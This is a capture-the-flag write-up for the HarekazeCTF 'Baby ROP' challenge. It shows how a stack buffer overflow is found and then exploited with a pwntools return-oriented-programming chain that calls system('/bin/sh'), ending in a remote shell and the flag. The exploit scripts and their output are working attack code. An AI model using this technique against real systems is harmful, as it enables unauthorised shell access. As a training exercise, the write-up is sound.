# Baby ROP

The program is running on Ubuntu 16.04.

nc problem.harekaze.com 20001

[babyrop](babyrop)

Run the program:
```bash
# ./babyrop 
What's your name? hi
Welcome to the Pwn World, hi!
```

Run `strings`:
```bash
# strings babyrop 
/lib64/ld-linux-x86-64.so.2
libc.so.6
__isoc99_scanf
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.2.5
UH-P
AWAVA
AUATL
[]A\A]A^A_
echo -n "What's your name? "
Welcome to the Pwn World, %s!
;*3$"
/bin/sh
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.10) 5.4.0 20160609
...
...
...
```

Looks like it contains string `/bin/sh` in the program

The title also hints it needs to do Return Oriented Programming (ROP)

Basically is like buffer overflow:
```
Buffer Overflow:
[ buffer ][ address to execute ]

Buffer Overflow with ROP:
[ buffer ][ address to execute ][ another address to execute ][ address again ][...]
```

First, lets find the buffer size using pwntools:
```python
from pwn import *
p = process('./babyrop')
p.sendline('a'*30)
print p.recv()
```
Output:
```
[x] Starting local process './babyrop'
[+] Starting local process './babyrop': pid 2921
What's your name? Welcome to the Pwn World, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!

[*] Stopped process './babyrop' (pid 2921)
```

Stopped means we hit the EIP (Instruction Pointer)

We can check with `dmesg` command:
```bash
# dmesg | grep baby
[ 1595.158999] babyrop[2921]: segfault at 616161616161 ip 0000616161616161 sp 00007ffc2efe3c80 error 14 in libc-2.28.so[7f02d848d000+22000]
```
As seen above, we overwritten 6 bytes of EIP `0000616161616161`

So our padding need to +2 and -8 to prepare the payload:
```python
from pwn import *
elf = ELF('./babyrop')
main = elf.symbols['main']
p = elf.process()
p.sendline('a'*24 + p64(main))
p.interactive()
```
Output:
```bash
python solve.py 
[*] '/root/Downloads/harekaze/rop/babyrop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/root/Downloads/harekaze/rop/babyrop': pid 3781
[*] Switching to interactive mode
What's your name? Welcome to the Pwn World, aaaaaaaaaaaaaaaaaaaaaaaa�@!
What's your name? [*] Got EOF while reading in interactive
$ 
```
But I don't know why get EOF

Anyway we execute the main function successfully

Next step is to find where is the `/bin/sh` is located in the program

Using `next(elf.search('/bin/sh'))` in pwntools to find the address 

Output:

```
[*] '/root/Downloads/harekaze/rop/babyrop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
0x601048
```
Looks like its located at `0x601048`

## Final step

Using the ROP library, we can easily build the payload to execute `system` with the string `/bin/sh`:
```python
from pwn import *
context.clear(arch='amd64') # 64 bit
elf = ELF('./babyrop')
sh = next(elf.search('/bin/sh'))
r = ROP(elf)
r.system(sh) # running system("/bin/sh")
p = elf.process()
p.sendline('a'*24 + str(r)) # send the payload
p.interactive()
```
Output:
```bash
# python solve.py 
[*] '/root/Downloads/harekaze/rop/babyrop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded cached gadgets for './babyrop'
[+] Starting local process '/root/Downloads/harekaze/rop/babyrop': pid 4707
[*] Switching to interactive mode
What's your name? Welcome to the Pwn World, aaaaaaaaaaaaaaaaaaaaaaaa\x83\x06@!
$ ls
babyrop  core  solve.py
```

Yay! Looks like we succeed! 

Change the process to netcat:
```python
# p = elf.process()
p = remote('problem.harekaze.com',20001)
```
Output:
```bash
# python solve.py 
[*] '/root/Downloads/harekaze/rop/babyrop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded cached gadgets for './babyrop'
[+] Opening connection to problem.harekaze.com on port 20001: Done
[*] Switching to interactive mode
What's your name? $ cd /home/babyrop
$ ls
babyrop
flag
$ cat flag
HarekazeCTF{r3turn_0r13nt3d_pr0gr4mm1ng_i5_3ss3nt141_70_pwn}
```

## Flag
> HarekazeCTF{r3turn_0r13nt3d_pr0gr4mm1ng_i5_3ss3nt141_70_pwn}